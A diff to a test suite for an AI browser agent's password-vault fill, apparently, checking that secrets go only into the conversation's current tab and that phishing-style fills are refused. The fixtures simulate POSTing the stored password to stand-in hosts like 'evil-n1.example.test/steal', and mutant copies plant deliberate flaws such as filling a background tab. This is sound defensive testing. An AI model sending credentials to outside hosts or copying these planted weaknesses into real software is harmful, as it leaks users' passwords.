@@ -19,6 +19,22 @@ import { runR28LoginNails } from './fixtures/r28-login-nails.mjs';
 import { runR29LoginNails } from './fixtures/r29-login-nails.mjs';
 import { runR30LoginNails } from './fixtures/r30-login-nails.mjs';
 
+// B-21cc (the coordinator's r2491): a vault fill acts on the session's CURRENT tab, which the keeper reads from the session's own
+// `tab list` (the row marked active). These worlds have no driver session, so each watch made here gets a keeper whose
+// `currentTabOf` answers the tab that watch's scene made current (`noteActiveTab`, on the watch or through the route), and refuses
+// by name when none was made current — never a guess. Every other keeper member is the world's own.
+function withCurrentTab(DmMod) {
+  return { ...DmMod, create(opts = {}) {
+    const cur = new Map();
+    const k0 = opts.keeper || null;
+    const keeper = k0 ? Object.assign({}, k0, { currentTabOf: async ({ profileId = '', browserKey = '' } = {}) => { const id = cur.get(String(profileId || '') + '|' + String(browserKey || '')); return id ? { ok: true, targetId: id } : { ok: false, code: 'current_tab_unreadable', error: 'VibeSpace could not read which tab this conversation is on (this world made none current) — nothing was filled; try again' }; } }) : k0;
+    const d = DmMod.create({ ...opts, keeper });
+    const n0 = d.noteActiveTab;
+    if (typeof n0 === 'function') d.noteActiveTab = (t, id) => { if (t && id) cur.set(String(t.profileId || '') + '|' + String(t.browserKey || ''), String(id)); return n0(t, id); };
+    return d;
+  } };
+}
+
 const require = createRequire(import.meta.url);
 const REPO = path.resolve(new URL('..', import.meta.url).pathname);
 const express = require(path.join(REPO, 'node_modules/express'));
@@ -455,7 +471,9 @@ console.log(JSON.stringify({ success: true, data: { ok: true } }));
   const fk = await startFakeKernel({ firstUrl: 'https://shop.example.test/login' });
   const tid = fk.targets()[0].targetId;
 
+  let b21ccCur = null; // B-21cc (r2491): this world's session's CURRENT tab — the one its scene last made current, else its first
   const stubKeeper = {
+    currentTabOf: async () => ({ ok: true, targetId: b21ccCur || tid }), // the stand-in for the keeper's own read (its session's `tab list`, the row marked active)
     resolveFor: () => ({ ok: true, kind: 'attachment', handle: 'shop', attachment: { profileId: PID, alias: 'shop', isDefault: true }, handles: ['shop'], isDefault: true }),
     attach: async () => ({ profile: prof, browser: { state: 'ready' }, lease: { profileId: PID, browserKey: KEY, sessionId: SID, since: clock }, env: [], pinTab: false, others: 0 }),
     statusFor: () => ({ ephemeral: null, leases: [{ profileId: PID, browserKey: KEY, sessionId: SID }] }),
@@ -489,6 +507,7 @@ console.log(JSON.stringify({ success: true, data: { ok: true } }));
     takeoverOf: () => isTakeover,
     conversationOf: () => ({ cid: CID, name: 'Shop Agent' }),
   });
+  { const noteKeep = watch.noteActiveTab; watch.noteActiveTab = (t, id) => { b21ccCur = id || b21ccCur; return noteKeep(t, id); }; } // B-21cc: a tab the scene makes current is its session's current one
 
   const sessions = new Map([[SID, { agentToken: TOKEN, _browserKey: KEY, _browserVariant: 'D', name: 'Shop Agent', cwd: ROOT4, backendSessionId: CID }]]);
   Rm.setup({ keeper: stubKeeper, activeSessions: sessions, dialogs: watch, logins, tasksForSession: () => [] });
@@ -1178,7 +1197,7 @@ if (typeof LF?.resolveSnapshotRef === 'function' && Dm.SCAN_LIMITS) {
     });
     wB.noteActiveTab({ profileId: 'bp-r24', browserKey: 'bk-r24' }, tidB);
     const fillHold = await wB.fillVaultField({ profileId: 'bp-r24', browserKey: 'bk-r24' }, {
-      target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-r24'] },
+      targetId: tidB, target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-r24'] },
     });
     const preHoldEvil = await fkStd.simulateSubmitRequest({ targetId: tidB, url: 'https://evil-n1.example.test/steal', postData: `pw=${encodeURIComponent(PW_N1)}`, resourceType: 'Fetch' });
     await fkStd.simulateSubmitRequest({ targetId: tidB, url: 'https://shop.example.test/api/login', postData: `pw=${encodeURIComponent(PW_N1)}`, resourceType: 'Fetch', finish: true });
@@ -1214,7 +1233,7 @@ if (typeof LF?.resolveSnapshotRef === 'function' && Dm.SCAN_LIMITS) {
       elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }],
     });
     const refillAfterFlip = await wB.fillVaultField({ profileId: 'bp-r24', browserKey: 'bk-r24' }, {
-      target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-r24'] },
+      targetId: tidB, target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-r24'] },
     });
     const afterRefillEvil = await fkStd.simulateSubmitRequest({ targetId: tidB, url: 'https://evil-refill.example.test/steal', postData: `pw=${encodeURIComponent(PW_N1)}`, resourceType: 'Fetch' });
     ok(personEvil.action === 'fail' && backAgentEvil.action === 'fail' && navNetDisables >= 1 && Boolean(refillAfterFlip?.ok) && afterRefillEvil.action === 'fail',
@@ -1265,7 +1284,7 @@ if (typeof LF?.resolveSnapshotRef === 'function' && Dm.SCAN_LIMITS) {
     // Fill `@e3001` on that 3,000-row page -> bounded `Accessibility.queryAXTree` resolves `@e3001` (~6 KiB), 0 `getFullAXTree`, watch stays open!
     const axMark1 = fkStd.mark();
     const fill3000 = await wB.fillVaultField({ profileId: 'bp-r24', browserKey: 'bk-r24' }, {
-      target: '@e3001', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-r24'] },
+      targetId: tidB, target: '@e3001', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-r24'] },
     });
     const callsOnFill = fkStd.calls().filter((c) => c.seq > axMark1);
     const fullAxOnFill = callsOnFill.filter((c) => c.method === 'Accessibility.getFullAXTree');
@@ -1282,7 +1301,7 @@ if (typeof LF?.resolveSnapshotRef === 'function' && Dm.SCAN_LIMITS) {
     fkStd.setDom(tidB, { url: 'https://shop.example.test/unlabelled-huge', elements: unlabelled3000, axPadBytes: 2000 });
     await wB.noteSnapshot({ profileId: 'bp-r24', browserKey: 'bk-r24' }, { parsedRefs: [{ ref: '@e1', role: 'textbox', name: '', nth: 0 }], targetId: tidB });
     const fillOversize = await wB.fillVaultField({ profileId: 'bp-r24', browserKey: 'bk-r24' }, {
-      target: '@e1', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-r24'] },
+      targetId: tidB, target: '@e1', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-r24'] },
     });
     const downAfterOversize = wEvents.filter((x) => x.kind === 'down').length;
     ok(!fillOversize.ok && fillOversize.code === 'target_not_found' && /limit|MiB/i.test(fillOversize.error || '') && downAfterOversize === downBeforeSnap,
@@ -1304,7 +1323,7 @@ if (typeof LF?.resolveSnapshotRef === 'function' && Dm.SCAN_LIMITS) {
     for (const [atkName, els] of attackModes) {
       fkStd.setDom(tidB, { url: 'https://shop.example.test/login', elements: els });
       const rAtk = await wB.fillVaultField({ profileId: 'bp-r24', browserKey: 'bk-r24' }, {
-        target: '#trap', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-r24'] },
+        targetId: tidB, target: '#trap', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-r24'] },
       });
       const valsAtk = fkStd.readDomValues(tidB);
       const countsAtk = fkStd.readDomInputCounts(tidB);
@@ -1329,6 +1348,99 @@ if (typeof LF?.resolveSnapshotRef === 'function' && Dm.SCAN_LIMITS) {
     engB.close();
     await fkStd.close();
     fs.rmSync(ROOT4B, { recursive: true, force: true });
+  }
+}
+
+// ═══ ④c B-21cc (the coordinator's r2491; report fb-03ae550a21): ONE TAB — the vault fill acts on the conversation's CURRENT tab ═══
+// Two owned tabs on two origins (made-up sites): the sign-in's (shop.example.test) and another (other.example.test). The watch's
+// own active entry names the OTHER tab (the report's state: the current tab changed without a tab ack). The keeper answers the
+// current tab (its session's own `tab list`): the fill judges and fills THAT tab — never the watch's entry, never «most recently
+// seen». Unreadable ⇒ refused by name. RED: the release's pick (the watch's entry) judged the OTHER tab — the reported refusal.
+console.log('④c B-21cc: the vault fill acts on the conversation\'s CURRENT tab — one tab judged and filled, no guess');
+if (typeof LF?.resolveSnapshotRef === 'function') {
+  const ROOT4C = scratch('vl-b21cc-current');
+  fs.rmSync(ROOT4C, { recursive: true, force: true });
+  fs.mkdirSync(ROOT4C, { recursive: true });
+  const fkC = await startFakeKernel({ firstUrl: 'https://shop.example.test/login', mode: { standard: true } });
+  const engC = VE.create({ dataDir: ROOT4C, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
+  await engC.setup('B21ccProof#Master9');
+  const wsC = [];
+  try {
+    const gC = GS.create({ memory: true });
+    const lgC = Lm.create({ vault: engC, grants: () => gC, log: () => {}, forYou: { add: () => 'fy-1', resolve() {} } });
+    const PW_C = 'B21ccCurrent!' + crypto.randomBytes(4).toString('hex');
+    lgC.addOwn({ origin: 'https://shop.example.test', username: 'alice', password: PW_C }, { who: 'owner' });
+    lgC.grant('web-login:https://shop.example.test#alice', 'any-account', 'session:conv-b21cc');
+    let curAnswer = null, asked = 0;
+    const mkKeeper = (withCurrent = true) => ({
+      cdpEndpointFor: async () => ({ ok: true, url: fkC.wsUrl }),
+      onLease: () => () => {},
+      saveLoginFenceState() {},
+      loginFenceStateOf: () => null,
+      loginChannelFor: ({ ephemeral = false, remoteSession = false, action = 'fill' } = {}) => stubLoginChannel({ ephemeral, remoteSession, hasCdp: Boolean(fkC.wsUrl), action }),
+      ...(withCurrent ? { currentTabOf: async () => { asked++; return typeof curAnswer === 'function' ? curAnswer() : curAnswer; } } : {}),
+    });
+    const T = { profileId: 'bp-b21cc', browserKey: 'bk-b21cc' };
+    const tidS = fkC.targets()[0].targetId;
+    fkC.setDom(tidS, { url: 'https://shop.example.test/login', elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
+    const tidO = fkC.addTarget('https://other.example.test/account');
+    fkC.setDom(tidO, { url: 'https://other.example.test/account', elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
+    const worldOn = async (Dmod, withCurrent = true) => {
+      const w = Dmod.create({ keeper: mkKeeper(withCurrent), log: quiet, enableTimeoutMs: 400, holdersOf: () => [{ browserKey: T.browserKey, sessionId: 's-b21cc' }], leaseCountOf: () => 1, logins: lgC });
+      wsC.push(w);
+      await w.arm(T.profileId);
+      for (let i = 0; i < 40; i++) { const a = await w.noteSnapshot(T, { parsedRefs: [{ ref: '@e1', role: 'textbox', name: 'Password', nth: 0 }], targetId: tidO }); if (a && a.ok) break; await new Promise((r) => setTimeout(r, 10)); }
+      for (let i = 0; i < 40; i++) { const a = await w.noteSnapshot(T, { parsedRefs: [{ ref: '@e1', role: 'textbox', name: 'Password', nth: 0 }], targetId: tidS }); if (a && a.ok) break; await new Promise((r) => setTimeout(r, 10)); }
+      w.noteActiveTab(T, tidO); // the watch's own entry: the OTHER tab (stale — the current tab moved without a tab ack)
+      return w;
+    };
+    const fillC = (w) => w.fillVaultField(T, { target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-b21cc'] } });
+    const valOf = (tid) => (fkC.readDomValues(tid) || {}).pw || '';
+    // (1) the current tab is the sign-in's: the fill acts on IT
+    const w1 = await worldOn(Dm);
+    curAnswer = { ok: true, targetId: tidS }; asked = 0;
+    const r1 = await fillC(w1);
+    ok(!!(r1 && r1.ok) && valOf(tidS) === PW_C && valOf(tidO) === '' && asked === 1,
+      'B-21cc: two owned tabs on two origins, the CURRENT one the sign-in\'s — the vault fill acts on IT (the value lands there, none in the other tab), whatever the watch\'s own entry says; the keeper asked once', { r1: r1 && { ok: r1.ok, code: r1.code, error: r1.error }, asked });
+    fkC.setDom(tidS, { url: 'https://shop.example.test/login', elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
+    // (2) the current tab is the OTHER site: refused, naming THAT site
+    curAnswer = { ok: true, targetId: tidO };
+    const r2 = await fillC(w1);
+    ok(!!(r2 && !r2.ok && r2.code === 'login_phishing' && /other\.example\.test/.test(r2.error || '')) && valOf(tidS) === '' && valOf(tidO) === '',
+      'B-21cc: the CURRENT tab on the OTHER site — refused login_phishing naming THAT site truly (the tab the conversation is on), nothing filled anywhere', { r2: r2 && { code: r2.code, error: r2.error } });
+    // (3) the current tab cannot be read: refused by name — never the watch's entry, never «most recently seen»
+    curAnswer = { ok: false, code: 'current_tab_unreadable', error: 'VibeSpace could not read which tab this conversation is on (its tab list did not answer) — nothing was filled; try again' };
+    const r3 = await fillC(w1);
+    curAnswer = () => { throw new Error('the gate: the read threw'); };
+    const r3t = await fillC(w1);
+    w1.shutdown();
+    const w4 = await worldOn(Dm, false);
+    const r4 = await fillC(w4);
+    w4.shutdown();
+    ok(!!(r3 && r3.code === 'current_tab_unreadable' && /did not answer/.test(r3.error) && r3t && r3t.code === 'current_tab_unreadable' && r4 && r4.code === 'current_tab_unreadable') && valOf(tidS) === '' && valOf(tidO) === '',
+      'B-21cc: a current tab that cannot be read — its read refused, its read threw, no reader at all — the fill is REFUSED BY NAME (current_tab_unreadable), nothing filled: no guess', { r3: r3 && r3.code, r3t: r3t && r3t.code, r4: r4 && r4.code });
+    // the order: a conversation with no tab of its own in scope is refused BEFORE its session is asked (a never-used session's `tab list` binds a tab)
+    const bdSrcC = fs.readFileSync(path.join(REPO, 'src/server/browser-dialogs.js'), 'utf8');
+    const fnC = bdSrcC.slice(bdSrcC.indexOf('  async function fillVaultField('), bdSrcC.indexOf('  async function fillVaultField(') + 9000);
+    ok(fnC.indexOf('if (!hasScopedTab(w, target))') > 0 && fnC.indexOf('if (!hasScopedTab(w, target))') < fnC.indexOf('keeper.currentTabOf(') && (() => { const rs = fs.readFileSync(path.join(REPO, 'src/routes/browser.js'), 'utf8'); const a = rs.indexOf('const r = await D.fillVaultField(t, {'); const b = rs.indexOf('});', a); return a > 0 && b > a && !/targetId/.test(rs.slice(a, b)); })(),
+      'B-21cc: the fill asks the current tab only once the conversation has a tab of its own in scope; the route hands the fill no tab of the caller\'s');
+    // RED: the release's pick (the watch's own entry, else «most recently seen») — the sign-in tab current, the OTHER judged
+    const MC = mutantCopies('b21cc-current-tab', REPO);
+    const relSrc = anchored(bdSrcC, fnC.slice(fnC.indexOf('    let fillTid = targetId;\n'), fnC.indexOf("    if (!e || !e.sid) return { ok: false, code: 'target_not_found', error: targetId ?")), '    const e = pickScopedTabFor(w, target, { targetId });\n', 'B-21cc control: the release\'s pick');
+    const DmRel = MC.load('src/server/browser-dialogs.js', relSrc, 'release-pick');
+    fkC.setDom(tidS, { url: 'https://shop.example.test/login', elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
+    const wR = await worldOn(DmRel);
+    curAnswer = { ok: true, targetId: tidS };
+    const rR = await fillC(wR);
+    ok(!!(rR && !rR.ok && rR.code === 'login_phishing' && /other\.example\.test/.test(rR.error || '')) && valOf(tidS) === '',
+      'RED CONTROL (B-21cc): the release\'s pick — the sign-in tab is the current one, yet the fill judged the watch\'s entry, the OTHER tab: refused login_phishing naming the other site (fb-03ae550a21, exactly)', { rR: rR && { code: rR.code, error: rR.error } });
+    for (const r of copiesCensus(MC.files, MC.dir, REPO, { label: 'B-21cc controls: ' })) ok(r.pass, r.name, r.detail);
+  } finally {
+    for (const w of wsC) { try { w.shutdown(); } catch { } }
+    LF?.clearAllFilledSecrets?.();
+    engC.close();
+    await fkC.close();
+    fs.rmSync(ROOT4C, { recursive: true, force: true });
   }
 }
 
@@ -1503,12 +1615,12 @@ if (ok(typeof LF?.fillVaultElement === 'function', 'r22 browser-login-fill.js ex
   const m7BdSrc = editAnchor(editAnchor(editAnchor(bdSrc,
     'function pickScopedTabFor(w, target, { targetId = null } = {}) {', 'function pickScopedTabFor(w, target, { targetId = null, preferRef = null } = {}) {', "src/server/browser-dialogs.js"),
     
-      'if (actE && inScope(scope, actE.targetId) && actE.sid) return actE;',
-      'if (actE && inScope(scope, actE.targetId) && actE.sid && (!preferRef || actE.snapshotRefs?.specs?.has(preferRef))) return actE;\n    if (preferRef) { const withRef = [...w.targets.values()].find((x) => x.sid && x.snapshotRefs?.specs?.has(preferRef)); if (withRef) return withRef; }'
+      '      return e && inScope(scope, e.targetId) && e.sid ? e : null;',
+      '      if (preferRef && !(e && e.snapshotRefs?.specs?.has(preferRef))) { const withRef = [...w.targets.values()].find((x) => x.sid && x.snapshotRefs?.specs?.has(preferRef)); if (withRef) return withRef; }\n      return e && inScope(scope, e.targetId) && e.sid ? e : null;'
     , "src/server/browser-dialogs.js"),
-    
-      'const isRef = /^@[A-Za-z0-9_-]+$/.test(tgtStr);\n    const e = pickScopedTabFor(w, target, { targetId });',
-      'const isRef = /^@[A-Za-z0-9_-]+$/.test(tgtStr);\n    const e = pickScopedTabFor(w, target, { targetId, preferRef: isRef ? tgtStr : null });'
+    // B-21cc (r2491): the fill names ONE tab (the conversation's current one), so the cross-tab fallback is planted where it now looks
+      '    const e = pickScopedTabFor(w, target, { targetId: fillTid });',
+      '    const e = pickScopedTabFor(w, target, { targetId: fillTid, preferRef: isRef ? tgtStr : null });'
     , "src/server/browser-dialogs.js");
   const BD_M7 = m7BdSrc !== bdSrc ? MUT.load('src/server/browser-dialogs.js', m7BdSrc, 'cross-tab-ref-fallback') : null;
   // Mutant 9 (M1): skip `precheckVaultFill` -> locked vault sends CDP calls and returns `login_phishing` on wrong-origin tab!
@@ -1568,7 +1680,7 @@ if (ok(typeof LF?.fillVaultElement === 'function', 'r22 browser-login-fill.js ex
           if (nsB && nsB.ok && nsB.count === 1) break;
           await new Promise((r) => setTimeout(r, 10));
         }
-        const r7 = await w7.fillVaultField({ profileId: 'bp-m7', browserKey: 'bk-m' }, { target: '@e2', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-m7'] } });
+        const r7 = await w7.fillVaultField({ profileId: 'bp-m7', browserKey: 'bk-m' }, { targetId: tidB2, target: '@e2', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-m7'] } });
         ok(Boolean(r7 && r7.ok) && fkM.readDomValues(tidA).pw === 'AliceMut!12345678',
           'MUTANT 7 RED (L4 cross-tab-ref-fallback): falling back to background tab snapshotRefs types secret into background tab A',
           { r7, domA: fkM.readDomValues(tidA) });
@@ -1583,7 +1695,7 @@ if (ok(typeof LF?.fillVaultElement === 'function', 'r22 browser-login-fill.js ex
         w9.noteActiveTab({ profileId: 'bp-m9', browserKey: 'bk-m' }, tidA);
         engM.lock();
         const m0 = fkM.mark();
-        const r9 = await w9.fillVaultField({ profileId: 'bp-m9', browserKey: 'bk-m' }, { target: '#pw', spec: 'shop.example.test#alice/password', facts: {} });
+        const r9 = await w9.fillVaultField({ profileId: 'bp-m9', browserKey: 'bk-m' }, { targetId: tidA, target: '#pw', spec: 'shop.example.test#alice/password', facts: {} });
         const c9 = fkM.calls().filter((c) => c.seq > m0);
         ok(c9.length >= 3, 'MUTANT 9 RED (M1 phishing-before-vault-locked): without precheckVaultFill, locked vault sends CDP calls to browser before refusing', { code: r9?.code, cdp: c9.length });
         w9.shutdown();
@@ -1752,7 +1864,7 @@ if (ok(typeof LF?.fillVaultElement === 'function', 'r22 browser-login-fill.js ex
         const w10 = BD_M10.create({ keeper: skR24, log: quiet, enableTimeoutMs: 400, holdersOf: () => holdersM, leaseCountOf: () => 1, logins: logR24, wipeMaxScanPositions: 256 });
         await w10.arm('bp-m10');
         w10.noteActiveTab({ profileId: 'bp-m10', browserKey: 'bk-mr24' }, tidR24);
-        await w10.fillVaultField({ profileId: 'bp-m10', browserKey: 'bk-mr24' }, { target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-mr24'] } });
+        await w10.fillVaultField({ profileId: 'bp-m10', browserKey: 'bk-mr24' }, { targetId: tidR24, target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-mr24'] } });
         await fkR24.simulateSubmitRequest({ targetId: tidR24, url: 'https://shop.example.test/api/login', postData: `pw=${encodeURIComponent(PW_M)}`, resourceType: 'Fetch', finish: true });
         await new Promise((r) => setTimeout(r, 40));
         const leak10 = await fkR24.simulateSubmitRequest({ targetId: tidR24, url: 'https://evil-m10.example.test/steal', postData: `pw=${encodeURIComponent(PW_M)}`, resourceType: 'Fetch' });
@@ -1767,7 +1879,7 @@ if (ok(typeof LF?.fillVaultElement === 'function', 'r22 browser-login-fill.js ex
         const w11 = BD_M11.create({ keeper: skR24, log: quiet, enableTimeoutMs: 400, holdersOf: () => holdersM, leaseCountOf: () => holdersM.filter((h) => !h.human).length, logins: logR24 });
         await w11.arm('bp-m11');
         w11.noteActiveTab({ profileId: 'bp-m11', browserKey: 'bk-mr24' }, tidR24);
-        await w11.fillVaultField({ profileId: 'bp-m11', browserKey: 'bk-mr24' }, { target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-mr24'] } });
+        await w11.fillVaultField({ profileId: 'bp-m11', browserKey: 'bk-mr24' }, { targetId: tidR24, target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-mr24'] } });
         holdersM = [{ browserKey: 'bk-h', human: true, input: 'user' }];
         await w11.arm('bp-m11');
         await new Promise((r) => setTimeout(r, 25));
@@ -1812,7 +1924,7 @@ if (ok(typeof LF?.fillVaultElement === 'function', 'r22 browser-login-fill.js ex
         const w14 = BD_M14.create({ keeper: skR24, log: quiet, enableTimeoutMs: 400, holdersOf: () => holdersM, leaseCountOf: () => 1, logins: logR24 });
         await w14.arm('bp-m14');
         w14.noteActiveTab({ profileId: 'bp-m14', browserKey: 'bk-mr24' }, tidR24);
-        await w14.fillVaultField({ profileId: 'bp-m14', browserKey: 'bk-mr24' }, { target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-mr24'] } });
+        await w14.fillVaultField({ profileId: 'bp-m14', browserKey: 'bk-mr24' }, { targetId: tidR24, target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-mr24'] } });
         const m0 = fkR24.mark();
         await fkR24.simulateSubmitRequest({ targetId: tidR24, url: 'https://shop.example.test/api/login', postData: `pw=${encodeURIComponent(PW_M)}`, resourceType: 'Fetch', finish: true });
         for (let i = 0; i < 40; i++) {
@@ -2061,7 +2173,7 @@ if (ok(typeof LF?.fillVaultElement === 'function', 'r22 browser-login-fill.js ex
           const w20 = Dm.create({ keeper: skR24, log: quiet, enableTimeoutMs: 400, holdersOf: () => [{ browserKey: 'bk-000020aa', sessionId: 's-m20' }], leaseCountOf: () => 1, logins: logR24 });
           await w20.arm('bp-000020bb');
           w20.noteActiveTab({ profileId: 'bp-000020bb', browserKey: 'bk-000020aa' }, tidR24);
-          await w20.fillVaultField({ profileId: 'bp-000020bb', browserKey: 'bk-000020aa' }, { target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-mr24'] } });
+          await w20.fillVaultField({ profileId: 'bp-000020bb', browserKey: 'bk-000020aa' }, { targetId: tidR24, target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-mr24'] } });
           const k20 = {
             clock: () => Date.now(),
             profileByRef: (r) => (r === 'bp-000020bb' || r === 'shop' ? prof20 : null),
@@ -2171,7 +2283,7 @@ if (ok(typeof LF?.fillVaultElement === 'function', 'r22 browser-login-fill.js ex
             { parsedRefs: [{ ref: '@e1', role: overLongRole, name: overLongName, nth: 0 }], targetId: 'T-CAP' },
           );
           await wCap2.fillVaultField({ profileId: 'bp-cap2', browserKey: 'bk-mr24' }, {
-            target: '@e1', spec: 'shop.example.test#alice/password', checkOnly: true, facts: { conversationKeys: ['conv-mr24'] },
+            targetId: 'T-CAP', target: '@e1', spec: 'shop.example.test#alice/password', checkOnly: true, facts: { conversationKeys: ['conv-mr24'] },
           });
           wCap2.shutdown();
           ok(snapCapRes.ok && Boolean(capturedQuery) && capturedQuery.accessibleName.length === 2048 && capturedQuery.role.length === 128,
@@ -2921,7 +3033,7 @@ if (ok(typeof LF?.fillVaultElement === 'function', 'r22 browser-login-fill.js ex
           await wRev.arm('bp-rev');
           wRev.noteActiveTab({ profileId: 'bp-rev', browserKey: 'bk-mr24' }, 'T-REV');
           const rRevFill = await wRev.fillVaultField({ profileId: 'bp-rev', browserKey: 'bk-mr24' }, {
-            target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-mr24'] },
+            targetId: 'T-REV', target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-mr24'] },
           });
           wRev.shutdown();
 
@@ -3029,7 +3141,7 @@ if (ok(typeof LF?.fillVaultElement === 'function', 'r22 browser-login-fill.js ex
             await wJump.arm('bp-jump');
             wJump.noteActiveTab({ profileId: 'bp-jump', browserKey: 'bk-mr24' }, 'T-JUMP');
             const res = await wJump.fillVaultField({ profileId: 'bp-jump', browserKey: 'bk-mr24' }, {
-              target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-mr24'] },
+              targetId: 'T-JUMP', target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-mr24'] },
             });
             fillFinished = true;
             await new Promise((r) => setTimeout(r, 20));
@@ -3180,7 +3292,7 @@ if (ok(typeof LF?.fillVaultElement === 'function', 'r22 browser-login-fill.js ex
             loginFenceStateOf: () => null,
             loginChannelFor: ({ ephemeral = false, remoteSession = false, action = 'fill' } = {}) => stubLoginChannel({ ephemeral, remoteSession, hasCdp: Boolean(fkR24.wsUrl), label: 'M2', action }),
           };
-          const wM2 = Dm.create({ keeper: kM2, log: quiet, enableTimeoutMs: 400, holdersOf: () => [{ browserKey: 'bk-000028cc', sessionId: 's-m2' }], leaseCountOf: () => 1, logins: logOtp });
+          const wM2 = withCurrentTab(Dm).create({ keeper: kM2, log: quiet, enableTimeoutMs: 400, holdersOf: () => [{ browserKey: 'bk-000028cc', sessionId: 's-m2' }], leaseCountOf: () => 1, logins: logOtp });
           await wM2.arm(profM2.id);
           wM2.noteActiveTab({ profileId: profM2.id, browserKey: 'bk-000028cc' }, tidR24);
           const tokM2 = 'vsst_' + crypto.randomBytes(12).toString('hex');
@@ -3437,7 +3549,7 @@ if (ok(typeof LF?.fillVaultElement === 'function', 'r22 browser-login-fill.js ex
             cdpEndpointFor: async () => ({ ok: true, url: `ws://127.0.0.1:${fPort}` }),
             attach: async () => ({ ok: true, profileId: 'prof-fence', key: 'bk-mr24', mediated: true }),
           };
-          const dm = DialogsMod.create({
+          const dm = withCurrentTab(DialogsMod).create({
             keeper: keeperStub,
             logins: loginsStub,
             holdersOf: () => probeHolders,
